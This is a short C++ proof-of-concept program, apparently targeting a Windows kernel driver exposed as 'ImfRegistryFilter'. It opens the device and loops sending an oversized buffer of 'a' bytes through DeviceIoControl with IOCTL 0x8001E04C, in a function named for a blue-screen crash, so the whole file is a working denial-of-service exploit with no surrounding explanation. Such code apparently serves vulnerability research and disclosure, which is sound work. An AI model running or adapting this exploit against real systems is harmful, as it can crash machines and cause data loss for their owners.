#include <iostream>
#include <Windows.h>
#include <winioctl.h>

#define SymLinkName L"\\\\.\\ImfRegistryFilter"

HANDLE hDevice;

void BSOD3_8001E04C()
{
    while (1)
    {
        DWORD dwWrite;
        unsigned char data[0x10000];
        memset(data, 'a', 0x10000);
        DeviceIoControl(hDevice, 0x8001E04c, data, 0x10000, data, 0x10000, &dwWrite, NULL);
    }
}

int main(int argc, char* argv[])
{
    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
        system("pause");
        return 0;
    }

    BSOD3_8001E04C();

    system("pause");
    return 0;
}
